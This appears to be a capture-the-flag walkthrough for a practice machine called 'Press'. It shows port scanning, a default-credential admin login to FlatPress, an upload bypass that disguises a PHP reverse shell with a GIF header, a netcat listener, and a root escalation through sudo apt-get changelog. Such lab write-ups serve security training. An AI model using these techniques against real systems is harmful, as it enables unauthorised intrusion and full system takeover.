# 🐧 Press

## Enumerating Services

First, we'll perform a generic scan to identify the open ports and services running on this machine.

```shell
# TCP
sudo nmap -sCV -p- --min-rate=10000 -Pn 192.168.229.29

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Lugx Gaming Shop HTML5 Template
8089/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-generator: FlatPress fp-1.2.1
|_http-title: FlatPress
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Enumerating port 22

```shell
# Check authentication methods on port 22
nmap --script ssh-auth-methods --script-args="ssh.user=root" -p 22 192.168.229.29

PORT   STATE SERVICE
22/tcp open  ssh
| ssh-auth-methods:
|   Supported authentication methods:
|     publickey
|_    password
```

## Enumerating port 80

Navigating to port 80 we find a page with the template of a game store, but we found no apparent vulnerability.

## Enumerating port 8089

On this port we find a FlatPress application. We logged in to the administration panel through the credentials admin:password.

In the upload tab, we tried to upload a PHP file, but the site responds with an error. We then edited the pentestmonkey reverse shell by adding a GIF file header.

```shell
cp php-reverse-shell.php GIF-php-reverse-shell.php

cat GIF-php-reverse-shell.php

GIF89a;
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
```

## Initial Access

We opened a listener on our machine and after sending the file to the server, we executed the PHP by clicking on Media Manager and then on our file.

```shell
# Listener
rlwrap -cAra nc -vnlp 443

# TTY Upgrade
whereis python
/usr/bin/python3.9 -c 'import pty; pty.spawn("/bin/bash")'

# Evidence
find / -iname local.txt 2>/dev/null
cat /var/www/local.txt
b75749dcd1febbaa7a83524e3db95670
```

## Privilege Escalation

Enumerating the machine we discovered that we can run the `apt-get` command as root without entering a password.

```shell
# Enum
sudo -l
```

Executing the commands below, as indicated on the GTFOBins page, we escalated privileges on the machine.

```shell
# Privilege Escalation
sudo apt-get changelog apt
!/bin/sh
```

## Post-Exploitation

With root privileges, we capture the target's flags.

```shell
# Evidence
cat /root/proof.txt
e0940fe34e2bb0d8b1f5364bd62f5c14
```
